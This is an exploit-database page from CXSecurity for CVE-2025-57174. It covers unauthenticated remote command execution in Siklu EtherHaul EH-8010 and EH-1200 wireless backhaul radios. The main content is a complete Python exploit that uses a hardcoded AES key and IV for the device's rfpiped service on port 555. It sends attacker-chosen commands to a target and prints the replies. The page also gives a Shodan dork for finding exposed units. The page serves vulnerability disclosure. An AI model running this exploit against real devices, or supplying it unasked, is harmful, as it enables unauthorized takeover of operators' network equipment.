---
title: Siklu EtherHaul Series EH-8010 Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2026020013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-14
fetch_date: 2026-02-15T04:14:46.420058
---

# Siklu EtherHaul Series EH-8010 Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Siklu EtherHaul Series EH-8010 Remote Command Execution** **2026.02.14**  Credit:  **[semaja2](https://cxsecurity.com/author/semaja2/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-57174](https://cxsecurity.com/cveshow/CVE-2025-57174/ "Click to see CVE-2025-57174")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")**  **[**Dork:** "EH-8010" or "EH-1200"](https://cxsecurity.com/dorks/)** | |

# Exploit Title:Siklu EtherHaul Series EH-8010 - Remote Command Execution
# Shodan Dork: "EH-8010" or "EH-1200"
# Date: 2025-08-02
# Exploit Author: semaja2 - Andrew James <semaja2@gmail.com>
# Vendor Homepage: https://www.ceragon.com/products/siklu-by-ceragon
# Software Link: ftp://ftp.bubakov.net/siklu/
# Version: EH-8010 and EH-1200 Firmware 7.4.0 - 10.7.3
# Tested on: Linux
# CVE: CVE-2025-57174
# Blog: https://semaja2.net/2025/08/02/siklu-eh-unauthenticated-rce/
#!/usr/bin/env python3
import argparse, socket, struct
from Crypto.Cipher import AES
PORT = 555
HDR\_LEN = 0x90
IV0 = struct.pack('<4I', 0xEA703B82, 0x75A9A17B, 0x1DFC7BB9, 0x55A24D72)
KEY = bytes([
0x89,0xE7,0xFF,0xBE,0xEB,0x2D,0x73,0xF5,
0xA9,0x10,0xFC,0x42,0x5B,0x1F,0x36,0x17,
0x9F,0xB9,0x5E,0x75,0x35,0xA3,0x42,0xA0,
0x5D,0x02,0x48,0xB1,0x19,0xD2,0x4B,0x82
])
def recv\_exact(sock: socket.socket, n: int) -> bytes:
out = bytearray()
while len(out) < n:
chunk = sock.recv(n - len(out))
if not chunk:
raise ConnectionError('socket closed')
out += chunk
return bytes(out)
def pad16\_zero(b: bytes) -> bytes:
r = len(b) & 0x0F
return b if r == 0 else (b + b'\x00' \* (16 - r))
def hdr\_checksum(hdr: bytes) -> int:
return (sum(hdr[0:0x0C]) + sum(hdr[0x10:HDR\_LEN])) & 0xFFFFFFFF
def build\_header(flag: int, msg: int, payload\_len: int) -> bytes:
hdr = bytearray(HDR\_LEN)
hdr[0] = flag & 0xFF
hdr[1] = msg & 0xFF
struct.pack\_into('<I', hdr, 0x08, payload\_len & 0xFFFFFFFF)
struct.pack\_into('<I', hdr, 0x0C, hdr\_checksum(hdr))
return bytes(hdr)
class RFPipeSession:
def \_\_init\_\_(self, key: bytes, iv0: bytes):
self.key = key
self.send\_iv = iv0
self.recv\_iv = iv0
def enc\_send(self, sock: socket.socket, data: bytes) -> None:
cipher = AES.new(self.key, AES.MODE\_CBC, iv=self.send\_iv)
ct = cipher.encrypt(data)
self.send\_iv = ct[-16:]
sock.sendall(ct)
def dec\_recv(self, sock: socket.socket, n\_plain: int) -> bytes:
if n\_plain <= 0:
return b''
n\_padded = (n\_plain + 15) & ~15
ct = recv\_exact(sock, n\_padded)
cipher = AES.new(self.key, AES.MODE\_CBC, iv=self.recv\_iv)
pt = cipher.decrypt(ct)
self.recv\_iv = ct[-16:]
return pt[:n\_plain]
def send\_header(self, sock: socket.socket, hdr\_plain: bytes) -> None:
if len(hdr\_plain) != HDR\_LEN:
raise ValueError('header must be 0x90 bytes')
self.enc\_send(sock, hdr\_plain)
def recv\_header(self, sock: socket.socket) -> bytes:
ct = recv\_exact(sock, HDR\_LEN)
cipher = AES.new(self.key, AES.MODE\_CBC, iv=self.recv\_iv)
pt = cipher.decrypt(ct)
self.recv\_iv = ct[-16:]
return pt
def connect\_any(host: str, port: int) -> socket.socket:
infos = socket.getaddrinfo(host, port, socket.AF\_UNSPEC, socket.SOCK\_STREAM)
last\_err = None
for fam, st, proto, \_, sa in infos:
s = socket.socket(fam, st, proto)
try:
s.connect(sa)
return s
except Exception as e:
last\_err = e
s.close()
raise ConnectionError(f'connect failed: {last\_err}')
def main():
ap = argparse.ArgumentParser(description='rfpiped command client (msg 0x01)')
ap.add\_argument('target', help='IPv4/IPv6 address')
ap.add\_argument('command', help='command string (e.g., "mo-info system")')
ap.add\_argument('--nul', action='store\_true', help='append NUL terminator to command')
ap.add\_argument('--recv', action='store\_true', help='receive and print response')
args = ap.parse\_args()
payload = args.command.encode('utf-8')
if args.nul:
payload += b'\x00'
hdr\_plain = build\_header(flag=0x00, msg=0x01, payload\_len=len(payload))
sess = RFPipeSession(KEY, IV0)
with connect\_any(args.target, PORT) as s:
sess.send\_header(s, hdr\_plain)
if payload:
sess.enc\_send(s, pad16\_zero(payload))
if args.recv:
rh = sess.recv\_header(s)
flag = rh[0]; rmsg = rh[1]
rlen = struct.unpack\_from('<I', rh, 0x08)[0]
print(f'Response: flag=0x{flag:02x} msg=0x{rmsg:02x} length={rlen}')
if rmsg in (0x03, 0x05):
return
if rlen:
body = sess.dec\_recv(s, rlen)
if body.endswith(b'\x00'):
body = body[:-1]
try:
print(body.decode('utf-8', errors='replace'))
except Exception:
print(body.hex())
if \_\_name\_\_ == '\_\_main\_\_':
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020013)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top